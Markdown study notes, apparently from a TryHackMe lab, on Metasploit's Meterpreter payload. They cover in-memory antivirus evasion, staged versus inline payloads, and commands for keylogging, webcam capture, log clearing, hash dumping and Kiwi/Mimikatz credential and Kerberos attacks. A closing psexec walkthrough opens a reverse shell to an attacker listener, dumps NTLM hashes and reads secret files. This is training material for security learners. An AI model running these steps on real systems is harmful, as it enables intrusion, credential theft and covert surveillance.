# ðŸ“˜ Notes on Meterpreter

## ðŸ”¹ What is Meterpreter?
- Meterpreter is a special **payload** of Metasploit.
- It runs on the target system but acts as an **agent** (command & control).
- It allows attacker to:
  - Interact with files
  - Run operating system commands
  - Use special Meterpreter features



## ðŸ”¹ How does Meterpreter work?
- Meterpreter **does not install** on the target.
- It runs **only in RAM (memory)** â†’ No file is written on disk.
- Why? Because **Antivirus (AV)** mainly scans **disk files** (e.g., `.exe`).
- If it stays in RAM:
  - Antivirus wonâ€™t easily detect it.
  - No `meterpreter.exe` file will be found.
- Attacker sees it as a **process**, not a file.



## ðŸ”¹ Stealth Features
1. **Runs in memory** â†’ avoids antivirus detection.
2. **Encrypted communication (TLS/HTTPS)** with attackerâ€™s system.
   - IDS/IPS (network security tools) usually canâ€™t inspect encrypted traffic.
3. **Process hiding**:
   - Example: Instead of `meterpreter.exe`, it hides under a legit process like `spoolsv.exe`.



## ðŸ”¹ Example: Exploiting Windows (MS17-010)
- Attacker exploited a Windows machine.
- Used command:
``` bash
meterpreter > getpid
Current pid: 1304
```
- This shows Meterpreter is running with **PID 1304**.



## ðŸ”¹ Listing Processes
Command:
``` bash
meterpreter > ps
```
Output (shortened):
``` bash
PID Name User
1304 spoolsv.exe NT AUTHORITY\SYSTEM
```
- Note: No `meterpreter.exe` is visible.
- Instead, it shows under **spoolsv.exe**.

---

## ðŸ”¹ Checking DLLs
Command (Windows CMD):
``` bash
tasklist /m /fi "pid eq 1304"
```
Output:
``` bash
Image Name PID Modules
spoolsv.exe 1304 ntdll.dll, kernel32.dll, msvcrt.dll, ...
```
- Again, no suspicious DLL like `meterpreter.dll`.
- Only normal Windows DLLs are listed.



## ðŸ”¹ Key Takeaways
- Meterpreter is **stealthy** â†’ runs in RAM, not on disk.
- Uses **encryption** to hide network traffic.
- Masquerades under **legit processes** (like `spoolsv.exe`).
- Still, most modern antivirus can detect it.
---
# ðŸ“˜ Notes on Meterpreter Payloads (Staged & Inline)

## ðŸ”¹ Metasploit Payload Types
1. **Inline (Single)**  
   - Whole payload is sent in **one step**.  
   - Larger in size but no second request needed.  

2. **Staged**  
   - Payload is delivered in **two steps**:  
     1. **Stager** (small part) â†’ gets initial access.  
     2. **Stage** (rest of payload) â†’ downloaded later.  
   - Advantage: **Smaller size** at first, useful for buffer overflows.  

ðŸ‘‰ Meterpreter payloads exist in **both staged & inline versions**.

---

## ðŸ”¹ Listing Meterpreter Payloads
Command to list all payloads with only Meterpreter ones shown:
``` bash
msfvenom --list payloads | grep meterpreter
```
Example output:
``` bash
android/meterpreter/reverse_http â†’ Meterpreter server for Android over HTTP
android/meterpreter/reverse_https â†’ Android Meterpreter over HTTPS
android/meterpreter/reverse_tcp â†’ Android Meterpreter, staged over TCP
android/meterpreter_reverse_http â†’ Android stageless reverse HTTP
android/meterpreter_reverse_https â†’ Android stageless reverse HTTPS
android/meterpreter_reverse_tcp â†’ Android stageless reverse TCP
apple_ios/aarch64/meterpreter_reverse_http â†’ iOS (stageless, HTTP)
apple_ios/aarch64/meterpreter_reverse_https â†’ iOS (stageless, HTTPS)
apple_ios/aarch64/meterpreter_reverse_tcp â†’ iOS (stageless, TCP)
java/meterpreter/bind_tcp â†’ Java Meterpreter, bind shell over TCP
```


## ðŸ”¹ Platforms Supported
Meterpreter has versions for:
- Android  
- Apple iOS  
- Java  
- Linux  
- OSX (Mac)  
- PHP  
- Python  
- Windows  



## ðŸ”¹ Choosing the Right Meterpreter Payload
Your choice depends on:

1. **Target OS**
   - Windows â†’ use `windows/meterpreter/...`
   - Linux â†’ use `linux/x86/meterpreter/...`
   - Android/iOS â†’ use `android/...` or `apple_ios/...`

2. **Components Available**
   - If Python installed â†’ `python/meterpreter/...`
   - If PHP website â†’ `php/meterpreter/...`

3. **Network Conditions**
   - Raw TCP allowed â†’ use `reverse_tcp`  
   - Only HTTPS allowed â†’ use `reverse_https`  
   - IPv6 less monitored â†’ choose IPv6 reverse payloads  



## ðŸ”¹ Example: MS17-010 EternalBlue Exploit
When using EternalBlue exploit, default payload is:
``` bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```
- This exploit **automatically selects** a compatible Meterpreter payload.



## ðŸ”¹ Showing Available Payloads for a Module
Command:
``` bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```
- This lists all payloads that can be used with this exploit.
- If default isnâ€™t what you want, you can select another payload.



## ðŸ”¹ Quick Comparison Table

| Payload Type   | Steps | Size | Usage Example |
|----------------|-------|------|----------------|
| **Staged**     | 2     | Small initial | `windows/meterpreter/reverse_tcp` |
| **Inline**     | 1     | Bigger | `windows/meterpreter_reverse_tcp` |

ðŸ‘‰ Remember:  
- `meterpreter/reverse_tcp` â†’ staged (two-step)  
- `meterpreter_reverse_tcp` â†’ inline (one-step)
---
# ðŸ“˜ Notes on Meterpreter Commands

## ðŸ”¹ Getting Help
- In any Meterpreter session (`meterpreter >`), type:
``` bash
help
```
- This shows all available commands.
- Different **Meterpreter versions (Windows/Linux/Android/etc.)** may have different commands.



## ðŸ”¹ Categories of Meterpreter Commands
Commands are grouped into categories:

- **Core commands**
- **File system commands**
- **Networking commands**
- **System commands**
- **User interface commands**
- **Webcam commands**
- **Audio output commands**
- **Elevate commands**
- **Password database commands**
- **Timestomp commands**  

ðŸ‘‰ Some commands may not work (e.g., webcam on a VM without a camera).



## ðŸ”¹ Core Commands (general usage)
| Command     | Description |
|-------------|-------------|
| `background` | Backgrounds the current session |
| `exit`       | Terminates Meterpreter session |
| `guid`       | Shows Session GUID (unique ID) |
| `help`       | Displays help menu |
| `info`       | Shows info about a post module |
| `irb`        | Opens interactive Ruby shell |
| `load`       | Loads Meterpreter extensions |
| `migrate`    | Move Meterpreter to another process (stealth) |
| `run`        | Executes a Meterpreter script / post module |
| `sessions`   | Switch between sessions |



## ðŸ”¹ File System Commands
| Command     | Description |
|-------------|-------------|
| `cd`        | Change directory |
| `ls` or `dir` | List files in current directory |
| `pwd`       | Print working directory |
| `cat <file>` | Show file contents |
| `edit <file>` | Edit a file |
| `rm <file>` | Delete a file |
| `search -f *.txt` | Search files (example: all `.txt`) |
| `upload <file>` | Upload file from attacker â†’ target |
| `download <file>` | Download file from target â†’ attacker |



## ðŸ”¹ Networking Commands
| Command     | Description |
|-------------|-------------|
| `arp`       | Show ARP cache (hosts in local network) |
| `ifconfig`  | Show network interfaces |
| `netstat`   | Show network connections |
| `portfwd`   | Forward local port â†’ remote service |
| `route`     | View/modify routing table |



## ðŸ”¹ System Commands
| Command     | Description |
|-------------|-------------|
| `clearev`   | Clear Windows event logs (cover tracks) |
| `execute`   | Run a command/program |
| `getpid`    | Show current process ID |
| `getuid`    | Show user Meterpreter is running as |
| `kill <pid>`| Kill process by PID |
| `pkill <name>` | Kill processes by name |
| `ps`        | List running processes |
| `reboot`    | Reboot target |
| `shutdown`  | Shutdown target |
| `shell`     | Drop into system shell (cmd/bash) |
| `sysinfo`   | Get OS & system info |



## ðŸ”¹ Other Useful Commands
| Command     | Description |
|-------------|-------------|
| `idletime`        | Show user idle time |
| `keyscan_start`   | Start keylogger |
| `keyscan_dump`    | Dump captured keystrokes |
| `keyscan_stop`    | Stop keylogger |
| `screenshare`     | Watch remote desktop live |
| `screenshot`      | Capture screenshot |
| `record_mic`      | Record microphone audio |
| `webcam_list`     | List webcams |
| `webcam_snap`     | Take webcam snapshot |
| `webcam_stream`   | Stream webcam video |
| `webcam_chat`     | Start video chat |
| `getsystem`       | Try privilege escalation (SYSTEM level) |
| `hashdump`        | Dump SAM database (Windows password hashes) |



## ðŸ”¹ Key Notes
- Commands are **built-in** â†’ no extra files needed.  
- Features depend on the **target environment**:  
  - If no webcam â†’ webcam commands wonâ€™t work.  
  - If no GUI (like on VM) â†’ screenshot/screenshare may fail.  
- Always run `help` after getting a session to check available commands.
---
# ðŸ“˜ Meterpreter Post-Exploitation Commands

## ðŸ”¹ 1. help
- Shows list of all available commands in current Meterpreter session.
- Different Meterpreter versions = different command sets.

Example:
``` bash
meterpreter > help
```


## ðŸ”¹ 2. getuid
- Shows which user account Meterpreter is running under.
- Helps identify privilege level (Admin or normal user).

Example:
``` bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
ðŸ‘‰ Here, session is running as **SYSTEM** (highest privilege in Windows).



## ðŸ”¹ 3. ps (list processes)
- Lists running processes on target system.
- Useful to identify where to migrate Meterpreter.

Example:
``` bash
meterpreter > ps
PID PPID Name User

716 692 winlogon.exe NT AUTHORITY\SYSTEM
1304 692 spoolsv.exe NT AUTHORITY\SYSTEM
```
ðŸ‘‰ Note: Each process has a **PID (Process ID)**.



## ðŸ”¹ 4. migrate <PID>
- Moves Meterpreter into another running process.
- Why?
  - Gain stability
  - Hide inside a normal process (e.g., `notepad.exe`)
  - Capture keystrokes (if user is typing there)

Example:
``` bash
meterpreter > migrate 716
[] Migrating from 1304 to 716...
[] Migration completed successfully.
```
âš ï¸ Warning:  
- If you migrate from **SYSTEM â†’ low-privilege process**, you may lose privileges.

---

## ðŸ”¹ 5. hashdump
- Dumps password hashes from Windows SAM (Security Account Manager).
- Hashes are stored in NTLM format.

Example:
``` bash
meterpreter > hashdump
Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b7...
Guest:501:aad3b435b51404ee...:31d6cfe0d16ae931b7...
Jon:1000:aad3b435b51404ee...:ffb43f0de35be4d991...
```
ðŸ‘‰ What to do with hashes?
- Crack using rainbow tables / online NTLM databases.
- Use **Pass-the-Hash** to authenticate on other systems.



## ðŸ”¹ 6. search
- Search files on target system.
- Useful in **CTFs** (flags) or real pentests (password files, configs).


Example:
``` bash
meterpreter > search -f flag2.txt
Found 1 result...
c:\Windows\System32\config\flag2.txt (34 bytes)
```


## ðŸ”¹ 7. shell
- Drops into a normal system command shell (cmd.exe on Windows, bash on Linux).
- Press **CTRL+Z** to return to Meterpreter.

Example:
``` bash
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```


# âœ… Quick Summary
- `help` â†’ list commands  
- `getuid` â†’ check current user privilege  
- `ps` â†’ list processes  
- `migrate <pid>` â†’ move session into another process  
- `hashdump` â†’ dump Windows password hashes  
- `search -f <file>` â†’ find files  
- `shell` â†’ open command prompt on target
---
# ðŸ“˜ Advanced Meterpreter Post-Exploitation

## ðŸ”¹ Privilege Escalation & Lateral Movement
- `getsystem` â†’ Tries to elevate Meterpreter to **SYSTEM** user.
- `hashdump` â†’ Dumps password hashes from Windows SAM.

ðŸ‘‰ Both are key for **privilege escalation** and **lateral movement** in a network.



## ðŸ”¹ load Command
- Used to load additional **extensions** inside Meterpreter.
- Allows more powerful tools like **Python scripting** or **Mimikatz (Kiwi)**.



### 1. Loading Python
- Python can be directly executed inside Meterpreter.
- Useful for **custom scripts** during post-exploitation.

Example:
``` bash
meterpreter > load python
Loading extension python... Success.
meterpreter > python_execute "print 'TryHackMe Rocks!'"
[+] Content written to stdout:
TryHackMe Rocks!
```



### 2. Loading Kiwi (Mimikatz)
- Kiwi = Meterpreter extension of **Mimikatz**.
- Used to dump credentials, Kerberos tickets, and perform AD attacks.

Example:
``` bash
meterpreter > load kiwi
Loading extension kiwi... Success.
```


## ðŸ”¹ Kiwi Commands (Mimikatz inside Meterpreter)

| Command                | Description |
|-------------------------|-------------|
| `creds_all`            | Retrieve all available credentials (parsed). |
| `creds_kerberos`       | Dump Kerberos credentials. |
| `creds_msv`            | Dump LM/NTLM credentials. |
| `creds_ssp`            | Dump SSP credentials. |
| `creds_tspkg`          | Dump TsPkg credentials. |
| `creds_wdigest`        | Dump WDigest credentials. |
| `dcsync`               | Perform a **DCSync attack** â†’ fetch user account info from DC. |
| `dcsync_ntlm`          | DCSync to extract **NTLM hash, SID, RID**. |
| `golden_ticket_create` | Create a **Golden Ticket** for Kerberos persistence. |
| `kerberos_ticket_list` | List all Kerberos tickets in memory. |
| `kerberos_ticket_purge`| Remove all Kerberos tickets from memory. |
| `kerberos_ticket_use`  | Inject/use a Kerberos ticket. |
| `kiwi_cmd`             | Run raw Mimikatz commands inside Meterpreter. |
| `lsa_dump_sam`         | Dump SAM credentials via LSA. |



## ðŸ”¹ Why load modules?
After loading modules (`load python`, `load kiwi`), run:
``` bash
meterpreter > help
```
ðŸ‘‰ This will update help menu with **new commands** related to the loaded module.



# âœ… Summary
- `getsystem` + `hashdump` â†’ privilege escalation + credential gathering.  
- `load python` â†’ run Python code/scripts inside target.  
- `load kiwi` â†’ powerful credential dumping + Kerberos attacks (Mimikatz).  
- Kiwi = weapon for **AD exploitation** (creds, tickets, persistence).
---
# Example of Post Exploitation Challenge
## Step 1: Search for the psexec exploit
``` bash
msf6 > search exploit/windows/smb/psexec
```
## Result:
- **Name**: exploit/windows/smb/psexec
- **Description:** Microsoft Windows Authenticated User Code Execution
## Step 2: Use the exploit
``` bash
msf6 > use exploit/windows/smb/psexec
```
- Default payload is windows/meterpreter/reverse_tcp
## Step 3: Set target options
``` bash
msf6 exploit(windows/smb/psexec) > set rhosts 10.10.20.148
rhosts => 10.10.20.148

msf6 exploit(windows/smb/psexec) > set smbuser ballen
smbuser => ballen

msf6 exploit(windows/smb/psexec) > set smbpass Password1
smbpass => Password1
```
## Step 4: Run exploit
``` bash
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.160.131:4444
[*] Connecting to 10.10.20.148:445...
[*] Authenticating as user 'ballen'...
[*] Executing payload...
[*] Sending stage (177734 bytes) to 10.10.20.148
[*] Meterpreter session 1 opened (10.10.160.131:4444 -> 10.10.20.148:60398)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
``` 
- âš¡ Root access mil gaya!
## Step 5: System info
``` bash
meterpreter > sysinfo

Computer     : ACME-TEST
OS           : Windows Server 2019 (Build 17763).
Architecture : x64
Domain       : FLASH
Logged Users : 1
```
## Step 6: Enumerate Shares
``` bash
meterpreter > shell
C:\Windows\system32> net share

Share name   Resource
----------   --------
C$           C:\
ADMIN$       C:\Windows
IPC$         Remote IPC
NETLOGON     C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
SYSVOL       C:\Windows\SYSVOL\sysvol
speedster    C:\Shares\speedster
```
## Step 7: Migrate process (stability)
``` bash
meterpreter > ps
meterpreter > migrate 760
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
## Step 8: Dump hashes
``` bash
meterpreter > hashdump

Administrator:500:...:58a478135a93ac3bf058a5ea0e8fdb71:::
ballen:1112:...:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:...:69596c7aa1e8daee17f8e78870e25a5c:::
```
## Step 9: Search for sensitive files
``` bash
meterpreter > search -f secrets.txt
Found: C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt

meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
My Twitter password is KDSvbsw3849

meterpreter > search -f realsecret.txt
Found: C:\inetpub\wwwroot\realsecret.txt

meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
The Flash is the fastest man alive
```
## âœ… Summary of what we achieved:
- Used psexec exploit with SMB creds
- Got a Meterpreter session as NT AUTHORITY\SYSTEM (highest privilege)
- Enumerated shares & processes
- Dumped password hashes
- Found sensitive files (secrets.txt, realsecret.txt)
